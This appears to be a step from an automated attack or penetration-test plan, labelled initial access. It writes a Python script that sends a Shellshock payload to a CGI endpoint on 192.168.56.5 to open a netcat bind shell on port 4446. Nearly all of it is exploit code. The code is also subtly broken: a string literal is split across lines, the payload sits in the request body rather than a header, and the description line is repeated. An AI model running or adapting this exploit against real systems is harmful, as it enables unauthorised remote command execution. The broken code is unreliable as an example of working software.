initial_access.description: Use Python script to exploit Shellshock for command execution and bind shell
initial_access.command:
cat > /tmp/shellshock.py << 'EOF'
import socket
import subprocess
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect(('192.168.56.5', 80))

payload = '() { :;}; /bin/nc -e /bin/bash -lvp 4446 -q 1 < /dev/null &
'
request = f'POST /cgi-bin/status HTTP/1.1\r\nHost: 192.168.56.5\r\nContent-Length: 1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nenv=HTTP_BASH_ENV=\'{payload}\'\r\n'

s.send(request.encode())
response = s.recv(1024)
print(response.decode())
s.close()
EOF

initial_access.description: Use Python script to exploit Shellshock for command execution and bind shell
